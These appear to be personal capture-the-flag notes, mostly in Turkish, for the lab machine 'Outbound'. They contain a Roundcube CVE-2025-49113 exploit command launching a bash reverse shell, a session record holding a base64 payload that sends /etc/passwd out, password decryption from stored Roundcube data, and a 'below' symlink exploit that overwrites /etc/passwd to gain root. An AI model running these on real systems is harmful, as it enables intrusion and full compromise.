
# Outbound - Linux - Easy

IP=`10.10.11.77`
## creds : `tyler:LhKL1o9Nm3X2`

------------------------------------------------------------------------------------

# enum

```bash
```

## ports: 22, 80

------------------------------------------------------------------------------------

# web - port 80

## mail.outbound.htb
ye 302 ediyor.

## Roundcube Webmail 1.6.10
## creds : `tyler:LhKL1o9Nm3X2`
CVE‑2025‑49113 – Post‑Auth Remote Code Execution in Roundcube via PHP Object Deserialization
> https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.234/1401 0>&1'"
```

------------------------------------------------------------------------------------

# Initial access - www-data
nc shell aldık.

.dockerenv var. galiba dockerdayız.

## linpeas protections var diyor.
```bash
╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor.d
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... enabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (docker)

```

## bir interfacei daha var
```bash

2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 9a:cf:64:d0:2b:7a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```
makine ıpsi: 172.17.0.2
İlk kullanılabilir IP: 172.17.0.1
Son kullanılabilir IP: 172.17.255.254


## active ports
```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (ss)
tcp   LISTEN 0      100          0.0.0.0:143       0.0.0.0:* 
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=202,fd=5),("nginx",pid=201,fd=5))
tcp   LISTEN 0      100          0.0.0.0:110       0.0.0.0:*
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
tcp   LISTEN 0      100          0.0.0.0:993       0.0.0.0:*
tcp   LISTEN 0      100          0.0.0.0:995       0.0.0.0:*
tcp   LISTEN 0      100        127.0.0.1:25        0.0.0.0:*
                                                      [::]:*   
tcp   LISTEN 0      100             [::]:143          [::]:*
tcp   LISTEN 0      100             [::]:110          [::]:*
tcp   LISTEN 0      100             [::]:993          [::]:*                            
tcp   LISTEN 0      100             [::]:995          [::]:*                                                         
```

RCDBPass2025 şifreyi diğer userlarda ssh olarak denicem.
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
olmadı

## db file
```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/aliases.db
```
bişi yok


## mariadb
```bash
╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 May 23 23:20 /etc/mysql/mariadb.cnf
[client-server]
socket = /run/mysqld/mysqld.sock
dir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
```

```bash
mysql -h localhost -P 3306 -u mysql -p
```

## roundcube files
```bash
drwxr-xr-x 1 www-data www-data 4096 Nov 12 10:01 /var/www/html/roundcube
-rw-r--r-- 1 root root 3024 Jun  6 18:55 /var/www/html/roundcube/config/config.inc.php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

```
database: `mysql://roundcube:RCDBPass2025@localhost/roundcube`
default IMAP key: `rcmail-!24ByteDESkey*Str` sanırım işimize yaramayacak

mysql deneyelim
```bash
mysql --help
mysql [OPTIONS] [database]

# -u:username -p :password
mysql -u roundcube -pRCDBPass2025
```
donup kaldı.

interactive kullanamıyom, python da yok (pty shell için).
batch modda mysql:
```bash
mysql -u roundcube -pRCDBPass2025 -e "SHOW DATABASES;"
```

databaselere bak.
```bash
www-data@mail:/$ mysql -u roundcube -pRCDBPass2025 -e "SHOW DATABASES;"
mysql -u roundcube -pRCDBPass2025 -e "SHOW DATABASES;"
Database
information_schema
roundcube
```

roundcube databaseindeki tablolar.
```bash
mysql -u roundcube -pRCDBPass2025 -D roundcube -e "SHOW TABLES;"
```

select * from users
```bash
www-data@mail:/$ mysql -u roundcube -pRCDBPass2025 -D roundcube -e "select * from users;"
<RCDBPass2025 -D roundcube -e "select * from users;"
user_id  username mail_host   created  last_login  failed_login   failed_login_counter language preferences

1  jacob localhost   2025-06-07 13:55:18  2025-11-13 12:52:42  2025-06-11 07:51:32  1  en_US a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2  mel   localhost   2025-06-08 12:04:51  2025-06-08 13:29:05  NULL  NULL  en_US a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3  tyler localhost   2025-06-08 13:28:55  2025-11-13 16:12:49  2025-11-13 11:04:17  1  en_US a:2:{s:11:"client_hash";s:16:"NReZjDdXCqEsmQXH";i:0;b:0;}
```

## cred: jacob's hash:`hpLLqLwmqbyihpi7`
ssh değil, crackstation'da yok.
* https://hashes.com/en/tools/hash_identifier bunun bir LM hashi olduğunu söyledi.
* https://www.tunnelsup.com/hash-analyzer/   Cisco ASA or PIX MD5 olduğunu söyledi.

bişi yok


writeupdan:
## session table

```bash
www-data@mail:/$ mysql -u roundcube -pRCDBPass2025 -D roundcube -e "select * from session;"
<DBPass2025 -D roundcube -e "select * from session;"
sess_id  changed  ip vars
1hb69f54oqpdds1v04u54u4ukh 2025-11-13 16:36:58  172.17.0.1  bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6IjdnYkpBWlU4TVEzdXRLeTFQUmlRUm9EUUdyaGE1dnVmIjtsb2dpbl90aW1lfGk6MTc2MzA1MTgxODt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9TUEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiTEdzd2xVdUk0bll6WlBOWmhDeGM0VUd6Y2wiO3JlcXVlc3RfdG9rZW58czozMjoiNDlmcFpFQVpCeTlQYjhjRlZ1RlZ4c0lNTmFpYlhVTVMiO3BsdWdpbnN8YToxOntzOjIyOiJmaWxlc3lzdGVtX2F0dGFjaG1lbnRzIjthOjE6e3M6NDoiIXh4eCI7YToxOntzOjIwOiIzMTc2MzA1MTgxODAzNjA5MDcwMCI7czo2NDoiL3Zhci93d3cvaHRtbC9yb3VuZGN1YmUvdGVtcC9SQ01URU1QYXR0bW50NjkxNjA5MmE1ODA0YzMwMzQwMjQ2NyI7fX19eHh4fE47MTp7czo1OiJmaWxlcyI7YToxOntzOjIwOiIzMTc2MzA1MTgxODAzNjA5MDcwMCI7YTo2OntzOjQ6InBhdGgiO3M6NjQ6Ii92YXIvd3d3L2h0bWwvcm91bmRjdWJlL3RlbXAvUkNNVEVNUGF0dG1udDY5MTYwOTJhNTgwNGMzMDM0MDI0NjciO3M6NDoic2l6ZSI7aTo1NjM7czo0OiJuYW1lIjtzOjIwMToifE86MTY6IkNyeXB0X0dQR19FbmdpbmUiOjMwOntzOjI1OiIAQ3J5cHRfR1BHX0VuZ2luZQBfc3RyaWN0IjtiOjA7czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX2RlYnVnIjtiOjA7czoyNToiAENyeXB0X0dQR19FbmdpbmUAX2JpbmFyeSI7czowOiIiO3M6MjQ6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudCI7czowOiIiO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9ncGdjb25mIjtzOjEwNjoiZWNobyAiWTNWeWJDQm9kSFJ3T2k4dk1UQXVNVEF1TVRRdU1UazBPamd3TURBdkpDaGpZWFFnTDJWMFl5OXdZWE56ZDJRZ2ZDQmlZWE5sTmpRZ0xYY3dLUT09InxiYXNlNjQgLWR8c2g7IyI7czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX2hvbWVkaXIiO3M6MDoiIjtzOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfcHVibGljS2V5cmluZyI7czowOiIiO3M6MzM6IgBDcnlwdF9HUEdfRW5naW5lAF9wcml2YXRlS2V5cmluZyI7czowOiIiO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF90cnVzdERiIjtzOjA6IiI7czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX3BpcGVzIjthOjA6e31zOjI5OiIAQ3J5cHRfR1BHX0VuZ2luZQBfYWdlbnRQaXBlcyI7YTowOnt9czoyODoiAENyeXB0X0dQR19FbmdpbmUAX29wZW5QaXBlcyI7YTowOnt9czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX3Byb2Nlc3MiO2I6MDtzOjMxOiIAQ3J5cHRfR1BHX0VuZ2luZQBfYWdlbnRQcm9jZXNzIjtOO3M6Mjg6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudEluZm8iO047czoyNzoiAENyeXB0X0dQR19FbmdpbmUAX2lzRGFyd2luIjtiOjA7czozMDoiAENyeXB0X0dQR19FbmdpbmUAX2RpZ2VzdF9hbGdvIjtOO3M6MzA6IgBDcnlwdF9HUEdfRW5naW5lAF9jaXBoZXJfYWxnbyI7TjtzOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfY29tcHJlc3NfYWxnbyI7TjtzOjI2OiIAQ3J5cHRfR1BHX0VuZ2luZQBfb3B0aW9ucyI7YTowOnt9czozMjoiAENyeXB0X0dQR19FbmdpbmUAX2NvbW1hbmRCdWZmZXIiO3M6MDoiIjtzOjMzOiIAQ3J5cHRfR1BHX0VuZ2luZQBfcHJvY2Vzc0hhbmRsZXIiO047czozMzoiAENyeXB0X0dQR19FbmdpbmUAX3N0YXR1c0hhbmRsZXJzIjthOjA6e31zOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfZXJyb3JIYW5kbGVycyI7YTowOnt9czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX2lucHV0IjtOO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9tZXNzYWdlIjtOO3M6MjU6IgBDcnlwdF9HUEdfRW5naW5lAF9vdXRwdXQiO3M6MDoiIjtzOjI4OiIAQ3J5cHRfR1BHX0VuZ2luZQBfb3BlcmF0aW9uIjtOO3M6Mjg6IgBDcnlwdF9HUEdfRW5naW5lAF9hcmd1bWVudHMiO2E6MDp7fXM6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF92ZXJzaW9uIjtzOjA6IiI7fQ==
2eu0i6u7cagr10k2hbqekumo8e 2025-11-13 16:36:57  172.17.0.1  dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJkU1JveW5FUG5iSjZoSHYzNUFRSU1tQjZhaTlNMVRXQyI7
4im9m2lk10920nof1969eln1n0 2025-11-13 16:36:58  172.17.0.1  dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGF4im9m2lk10920nof1969eln1n0   2025-11-13 16:36:58  172.17.0.1  dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGF4im9m2lk10920nof1969eln1n0   2025-11-13 16:36:58  172.17.0.1  dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJoWG81RDhheXpwQWN5cEk5V1NNeUtPRUE5bDBFQ1dpSCI7
6a5ktqih5uca6lj8vrmgh9v0oh 2025-06-08 15:46:40  172.17.0.1  bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

devasa base64 içinde:
`username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"`
password enc halde :L7Rv00A8TuwJAr67kITxxcSgnIk25Am

bu base64 encoded.
hex hali : `2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf`


## Triple DES decrypt

google search ile roundcube'de triple des varmış.

cyberchefte
* des key: utf-8: `rcmail-!24ByteDESkey*Str`
* ilk 8 hex: IV ((Initialization Vector) fieldına girilecek: `2f b4 6f d3 40 3c 4e ec`
* kalanlar input: `09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09`

## cred: `jacob:595mO8DmwGeD`

tuhaf bir şekilde ssh girmiyor ama
```bash
www-data@mail:/$ su jacob
su jacob
Password: 595mO8DmwGeD
```
ile girdim.

`cat /home/jacob/mail/INBOX/jacob`

```bash
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
   id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
   id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel

```
Below adı verilen tool ile jacob adamının yetkisini azaltmışlar
Linux sistem izleme ve performans analiz aracıdır. Facebook (Meta) tarafından geliştirilmiş açık kaynaklı bir programdır.


## SSH creds: `jacob:gY4Wr3a1evp4`
# user.txt : `7d0d81b63303f5375edb4e34febde1cf`

------------------------------------------------------------------------------------

# ssh - jacob


## sudo -l
```bash
(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below
        -d*
```
> https://github.com/incommatose/CVE-2025-27591-PoC

poc.sh diye bir dosyayı direkt sudo ile çalıştırmak yasak olduğu için manuel yaptım.

```bash
jacob@outbound:/dev/shm$ cat poc.sh
#!/bin/bash

echo 'evil::0:0:root:/root:/bin/bash' > /tmp/evilpasswd 
rm -f /var/log/below/error_root.log 
ln -s /etc/passwd /var/log/below/error_root.log # Symlink
cat /tmp/evilpasswd > /var/log/below/error_root.log # Overwrite passwd 
export LOGS_DIRECTORY=/var/log/below

# Exploit
sudo /usr/bin/below snapshot --begin now 2>/dev/null
su evil

jacob@outbound:/dev/shm$ echo 'evil::0:0:root:/root:/bin/bash' > /tmp/evilpasswd 
rm -f /var/log/below/error_root.log 
ln -s /etc/passwd /var/log/below/error_root.log # Symlink
cat /tmp/evilpasswd > /var/log/below/error_root.log # Overwrite passwd 
export LOGS_DIRECTORY=/var/log/below
jacob@outbound:/dev/shm$ sudo /usr/bin/below snapshot --begin now 2>/dev/null
jacob@outbound:/dev/shm$ su evil
evil@outbound:/dev/shm# cat /root/root.txt
06cbbba660b606ced2fb804033f91959
```

# root.txt : `06cbbba660b606ced2fb804033f91959`


------------------------------------------------------------------------------------

------------------------------------------------------------------------------------
